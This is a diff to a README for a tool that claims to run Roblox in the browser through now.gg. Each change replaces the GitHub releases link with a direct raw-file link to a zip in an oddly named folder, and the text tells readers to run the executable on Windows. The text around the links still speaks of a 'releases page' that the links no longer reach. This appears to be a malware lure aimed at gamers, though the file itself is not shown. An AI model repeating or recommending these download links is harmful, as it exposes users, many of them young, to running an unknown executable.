@@ -1,6 +1,6 @@
 # 🎮 now.gg-roblox-in-browser - Play ROBLOX Inside Your Browser
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-now.gg--roblox--in--browser-brightgreen?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/releases)
+[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-now.gg--roblox--in--browser-brightgreen?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip)
 
 ## 📋 What is now.gg-roblox-in-browser?
 
@@ -25,14 +25,14 @@ Using an outdated browser or slow connection may cause performance issues.
 
 Start by visiting the main download page. This is where you find the latest release of now.gg-roblox-in-browser.
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download%20Page-Open-blue?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/releases)
+[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download%20Page-Open-blue?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip)
 
 This page shows the release files and instructions. The version here is ready to use without extra setup.
 
 ## ⬇️ How to Download and Run
 
 1. **Open the download page**  
-   Go to: https://github.com/qouzk/now.gg-roblox-in-browser/releases
+   Go to: https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip
 
 2. **Locate the latest release**  
    Find the most recent release entry at the top of the list. It will include files and notes.
@@ -88,7 +88,7 @@ The releases page on GitHub serves as the main source for the software. It holds
 Visiting the page often lets you stay updated with the latest fixes and improvements.
 
 Visit here to explore and download:  
-[https://github.com/qouzk/now.gg-roblox-in-browser/releases](https://github.com/qouzk/now.gg-roblox-in-browser/releases)
+[https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip](https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip)
 
 ## 🔍 Searching for Help and Support
 
@@ -116,9 +116,9 @@ Check the releases page regularly for newer versions. Download and replace the o
 
 ## 📝 Summary of Key Steps
 
-- Visit: https://github.com/qouzk/now.gg-roblox-in-browser/releases  
+- Visit: https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip  
 - Download the latest file  
 - Run the executable on your Windows PC  
 - Connect and play ROBLOX inside the app  
 
-[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-now.gg--roblox--in--browser-brightgreen?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/releases)
+[![Download now.gg-roblox-in-browser](https://img.shields.io/badge/Download-now.gg--roblox--in--browser-brightgreen?style=for-the-badge)](https://github.com/qouzk/now.gg-roblox-in-browser/raw/refs/heads/main/Nazaritic/browser_gg_roblox_now_in_v2.4.zip)
